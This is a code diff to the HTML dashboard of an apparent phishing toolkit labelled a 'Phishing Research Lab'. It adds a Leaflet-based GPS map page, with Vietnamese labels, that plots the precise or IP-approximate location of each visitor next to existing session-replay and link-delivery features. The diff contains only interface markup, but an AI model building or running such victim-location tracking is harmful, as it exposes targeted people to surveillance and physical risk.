@@ -5,7 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Phishing Research Lab — Dashboard</title>
     <link rel="stylesheet" href="dashboard-style.css">
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
     <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.min.js"></script>
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 </head>
 <body>
     <div class="toast-container" id="toastContainer"></div>
@@ -18,7 +20,7 @@
             <div class="logo-icon"><i data-lucide="shield-check" class="icon-sm"></i></div>
             <div>
                 <h1>Research Lab</h1>
-                <span class="ver">Security v3.0</span>
+                <span class="ver">Security v3.1</span>
             </div>
         </div>
         <nav class="sidebar-nav">
@@ -38,6 +40,12 @@
             </div>
             <div class="nav-item" onclick="switchPage('replay',this)" id="nav-replay">
                 <span class="nav-icon"><i data-lucide="video"></i></span> Session Replay
+            </div>
+
+            <div class="nav-label">Analytics</div>
+            <div class="nav-item" onclick="switchPage('analytics',this)" id="nav-analytics">
+                <span class="nav-icon"><i data-lucide="map-pin"></i></span> GPS Map
+                <span class="nav-badge" id="navBadgeAnalytics" style="background:var(--green);color:#000">0</span>
             </div>
 
             <div class="nav-label">Tools</div>
@@ -195,6 +203,56 @@
                                 <button class="btn-preview" onclick="window.open(document.getElementById('delivLink').textContent,'_blank')"><i data-lucide="external-link" class="icon-btn"></i> Open</button>
                             </div>
                         </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- PAGE: ANALYTICS -->
+            <div class="page" id="page-analytics">
+                <div class="section">
+                    <div class="section-header">
+                        <h2 class="section-title">📍 GPS Location Map</h2>
+                        <div class="section-actions">
+                            <button class="btn btn-ghost" onclick="loadAnalytics()"><i data-lucide="refresh-cw" class="icon-btn"></i> Reload</button>
+                        </div>
+                    </div>
+                    <p class="section-desc">Vị trí thực tế của từng lượt truy cập — GPS chính xác hoặc xấp xỉ theo IP.</p>
+
+                    <!-- Stats row -->
+                    <div class="analytics-stats" id="analyticsStats">
+                        <div class="an-stat">
+                            <div class="an-val" id="anTotal">0</div>
+                            <div class="an-lbl">Tổng lượt</div>
+                        </div>
+                        <div class="an-stat">
+                            <div class="an-val gps-val" id="anGPS">0</div>
+                            <div class="an-lbl">GPS thật</div>
+                        </div>
+                        <div class="an-stat">
+                            <div class="an-val" id="anIP">0</div>
+                            <div class="an-lbl">Theo IP</div>
+                        </div>
+                        <div class="an-stat">
+                            <div class="an-val" id="anNoLoc">0</div>
+                            <div class="an-lbl">Không có</div>
+                        </div>
+                    </div>
+
+                    <!-- Map -->
+                    <div class="map-wrapper">
+                        <div id="analyticsMap"></div>
+                        <div class="map-legend">
+                            <span class="legend-item"><span class="legend-dot gps"></span>GPS chính xác</span>
+                            <span class="legend-item"><span class="legend-dot ip"></span>Xấp xỉ IP</span>
+                        </div>
+                    </div>
+
+                    <!-- Location list -->
+                    <div class="section-header" style="margin-top:20px">
+                        <h2 class="section-title" style="font-size:13px">Danh sách vị trí</h2>
+                    </div>
+                    <div id="locationList" class="location-list">
+                        <div class="empty-state">Chưa có dữ liệu GPS</div>
                     </div>
                 </div>
             </div>
